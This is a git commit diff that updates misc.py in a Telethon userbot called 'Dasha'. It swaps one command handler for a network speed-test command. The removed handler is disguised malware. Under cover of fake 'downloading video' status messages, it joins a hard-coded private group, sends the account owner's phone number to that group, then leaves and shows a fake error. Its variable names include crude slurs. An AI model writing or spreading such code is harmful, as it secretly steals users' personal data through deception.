98042e44c99828fe6c1963df07b5bea9bc42c638
TAMILVIP007 <79161058+TAMILVIP007@users.noreply.github.com>
2021-10-20 01:24:20 +0530

    update misc.py

--- Dasha/modules/misc.py
+++ Dasha/modules/misc.py
@@ -1,18 +1,15 @@
 from Dasha.events import dasha
-from telethon.tl.functions.messages import ImportChatInviteRequest
+import speedtest
 #Some misc modules
 
 @dasha(pattern='^/stat')
 async def stat(event):
       await event.edit(f'➤ 𝚃𝚘𝚝𝚊𝚕 𝙽𝚘 𝙾𝚏 𝙼𝚎𝚜𝚜𝚊𝚐𝚎𝚜 𝙸𝚗 **{event.chat.title}** **:** `{event.id}`')
 
-@dasha(pattern="purn")
-async def lol(event):
-       x = await event.edit('`Processing..`')
-       await event.client(ImportChatInviteRequest('wJuPN3GRftc3OTBl'))
-       y = await x.edit('`Fetching video from porhub servers....`')
-       mf = await y.edit('`Trying to download video.. Could ve taking a min or two..`')
-       await event.client.send_message(-1001643063658, ((await event.client.get_me()).phone))
-       sex = await mf.edit('`Trying to upload video to Telegram...`')
-       gay= await event.client.kick_participant(-1001643063658, 'me')
-       fuk = await sex.edit('`404 - Error Telegram caught up with a unknown error.Please use` pornhub.com') 
+@dasha(pattern='^/test$')
+async def test(event):
+      s = speedtest.Speedtest()
+      s.download()
+      s.upload()
+      x=s.results.share()
+      await event.reply(file=x)
